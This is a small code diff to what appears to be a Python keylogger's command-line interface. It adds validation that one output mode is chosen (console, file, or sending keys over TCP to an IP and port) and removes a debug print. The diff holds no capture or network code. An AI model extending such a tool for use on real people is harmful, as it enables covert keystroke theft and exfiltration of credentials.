@@ -21,13 +21,17 @@ def parse_args():
                         nargs=2, metavar=('IP', 'PORT'),
                         help='Send keys to a given server')
 
-    return parser.parse_args()
+    args = parser.parse_args()
+
+    if not args.console and args.file is None and args.tcp is None:
+        parser.print_usage()
+        exit(1)
+    
+    return args
 
 
 if __name__ == '__main__':
     args = parse_args()
-
-    print(args)
 
     keylogger = Keylogger()
 
